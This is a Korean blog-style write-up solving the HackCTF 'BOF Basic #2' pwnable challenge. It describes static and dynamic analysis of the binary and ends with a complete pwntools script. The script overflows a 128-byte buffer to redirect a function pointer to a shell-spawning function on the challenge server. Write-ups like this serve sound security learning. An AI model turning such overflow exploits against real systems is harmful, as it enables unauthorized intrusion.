---
title:  "[HackCTF] BOF Basic #2 풀이"
categories:
    - Pwnable
tags:
    - ctf.j0n9hyun.xyz
toc: true
published: true
---
[HackCTF] BOF Basic #2 풀이

# Environments

|Name|Config|
|:---:|:---|
|CPU|Apple M1|
|Architecture|ARM64|
|OS|Microsoft Windows 11 on ARM|
|Tools|- gdb-peda<br/>- Hex-Rays IDA 7.5|

# Problem
![](/assets/HCTF/bof_basic-1-0.png)
```
Get Input
Print 하아아아아아아아앙
```

요약: `bof_basic2`, `nc ctf.j0n9hyun.xyz 3001` 으로부터 flag 찾기

# File Format
![](/assets/HCTF/bof_basic-1-1.png)

![](/assets/HCTF/bof_basic-1-2.png)

> x86 ELF LSB Executable, Not Stripped, Not UPX Packed

# checksec

|Name|Status|
|:---:|:---|
|CANARY|disabled|
|FORTIFY|disabled
|NX|ENABLED|
|PIE|disabled|
|RELRO|Partial|

- Can overwrite GOT

# Solution
![](/assets/HCTF/bof_basic-1-3.png)

우선 Function 정보를 `info func`를 통해 확인 함. system func call 이 이루어지므로 해당 func을 호출하는 것을 목표로 정함.

![](/assets/HCTF/bof_basic-1-4.png)

다만 main func를 보면 따로 `fgets` 외에 별다른 call 이 없음. `call eax`를 통해 진행되는 것 확인. `system@plt` 가 존재 하므로 어디선가는 확실히 call을 함.

![](/assets/HCTF/bof_basic-1-6.png)

IDA를 통해 정적 분석으로 이동. `void` 형 pointer 발견. 이 후 v5에 `sup` method를 넣음. 또한 메모리의경우 0x8C 를 서로 나눈 것으로 확인. `ebp`로부터 0x80 (128), 0xC (12) 만큼 서로 나눔. `fgets`가 133 까지 입력을 받으므로 `s`를 bof 시켜 `v5`에 들어갈 `sup` func 의 주소를 바꿀 수 있음.

`sup` 메서드는 단순 `puts`를 호출하는 메서드 임을 확인. `func` 목록 중 이제서야 `shell` 이라는 누가봐도 답 혹은 함정 일 것 같은 func 뒤늦게 발견. 판단 오류였다. 왜 정보를 놓쳤는가...다시 한번 다짐한다.

![](/assets/HCTF/bof_basic-1-7.png)

`system`을 call 하는 것 확인. 이제 `sup`의 주소를 `0x0804849b`로 자연스럽게 넘기면 `system@plt` call 가능.

# Exploit Scenario
```
# p32: 4 Byte packing
payload = "Z" * 128 + p32(0x0804849b)
```

# Exploit Code
```
from pwn import *
context.log_level = "DEBUG" # set log level to debug

p = remote("ctf.j0n9hyun.xyz", 3001)
payload = "Z" * 128 + p32(0x0804849b)

p.sendline(payload) # send payload to p
p.interactive() # Prevent closing shell
```

# Result
![](/assets/HCTF/bof_basic-1-5.png)